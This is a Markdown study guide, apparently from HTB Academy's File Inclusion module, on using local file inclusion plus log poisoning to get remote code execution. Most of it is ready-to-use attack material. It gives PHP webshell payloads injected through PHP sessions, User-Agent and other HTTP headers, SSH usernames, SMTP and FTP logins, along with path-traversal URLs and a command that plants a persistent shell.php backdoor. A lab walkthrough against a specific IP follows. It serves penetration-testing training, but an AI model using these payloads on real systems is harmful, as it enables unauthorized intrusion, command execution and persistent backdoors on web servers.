# Log Poisoning Techniques - HTB Academy Guide

## Overview

Log poisoning combines LFI with log file contamination to achieve remote code execution by injecting malicious code into log files that can later be included and executed.

**Prerequisites:**
- LFI vulnerability allowing access to log files
- Ability to control logged data (User-Agent, HTTP headers, SSH attempts, etc.)
- Web server with write permissions to log files

---

## Method 1: PHP Session Poisoning

### Complete 5-Step Workflow

**Step 1: Identify Session File Location**
```bash
# Common PHP session locations
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID

# Get PHPSESSID from cookies
curl -I http://target.com/ | grep -i set-cookie
```

**Step 2: Poison Session Data**
```bash
# Include poisoned session via LFI
http://target.com/lfi.php?file=../../../../var/lib/php/sessions/sess_SESSIONID

# Inject PHP code into session
http://target.com/lfi.php?language=<?php system($_GET["cmd"]); ?>
```

**Step 3: Execute Commands**
```bash
# Access session file with command parameter
http://target.com/lfi.php?file=../../../../var/lib/php/sessions/sess_SESSIONID&cmd=id
```

---

## Method 2: Apache/Nginx Access Log Poisoning

### User-Agent Poisoning

**Step 1: Identify Log Location**
```bash
# Apache logs
/var/log/apache2/access.log
/var/log/httpd/access_log

# Nginx logs  
/var/log/nginx/access.log
```

**Step 2: Poison User-Agent Header**
```bash
# Via curl
curl -s "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Via Burp Suite
# Intercept request and modify User-Agent header
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3: Execute via Log Inclusion**
```bash
# Include poisoned access log
http://target.com/lfi.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```

---

## Method 3: SSH Log Poisoning

### SSH Auth Log Contamination

**Step 1: Identify SSH Log Location**
```bash
/var/log/auth.log       # Debian/Ubuntu
/var/log/secure         # CentOS/RHEL
```

**Step 2: Poison SSH Login Attempts**
```bash
# Inject PHP code in username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Multiple attempts for reliable poisoning
for i in {1..5}; do
    ssh '<?php system($_GET["cmd"]); ?>'@target.com
done
```

**Step 3: Execute via Log Inclusion**
```bash
http://target.com/lfi.php?file=../../../../var/log/auth.log&cmd=id
```

---

## Method 4: Mail Log Poisoning

### SMTP Log Contamination

**Common Mail Logs:**
```bash
/var/log/mail.log
/var/log/mail.err
/var/mail/www-data
```

**Poisoning Technique:**
```bash
# Send email with PHP payload in sender field
telnet target.com 25
MAIL FROM: <?php system($_GET["cmd"]); ?>
```

---

## Method 5: FTP Log Poisoning

### FTP Authentication Logs

**Log Locations:**
```bash
/var/log/vsftpd.log
/var/log/ftp.log
```

**Poisoning via FTP Login:**
```bash
ftp target.com
# Username: <?php system($_GET["cmd"]); ?>
```

---

## HTB Academy Log Poisoning Lab

### Complete Lab Walkthrough

**Objective:** Achieve RCE via log poisoning and read flag

**Step 1: Identify Vulnerable Parameter**
```bash
http://83.136.254.199:58743/index.php?language=en
```

**Step 2: Test LFI**
```bash
http://83.136.254.199:58743/index.php?language=../../../../etc/passwd
```

**Step 3: Identify Session Location**
```bash
# Check for PHP sessions
http://83.136.254.199:58743/index.php?language=../../../../var/lib/php/sessions/sess_SESSIONID
```

**Step 4: Poison Session**
```bash
# Inject PHP code via language parameter
http://83.136.254.199:58743/index.php?language=<?php system($_GET["cmd"]); ?>
```

**Step 5: Execute Commands**
```bash
# Include session with command execution
http://83.136.254.199:58743/index.php?language=../../../../var/lib/php/sessions/sess_SESSIONID&cmd=find / -name "*flag*" 2>/dev/null
```

---

## Advanced Log Poisoning Techniques

### Multi-Field Poisoning
```bash
# Poison multiple HTTP headers
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
     -H "X-Forwarded-For: <?php system(\$_GET['cmd2']); ?>" \
     -H "Referer: <?php system(\$_GET['cmd3']); ?>" \
     http://target.com/
```

### Persistent Shell Creation
```bash
# Create persistent backdoor in logs
curl -H "User-Agent: <?php file_put_contents('shell.php', '<?php system(\$_GET[\"cmd\"]); ?>'); ?>" \
     http://target.com/
```

---

*[Content continues with troubleshooting and additional techniques...]*

*This guide covers advanced log poisoning techniques from HTB Academy's File Inclusion module.* 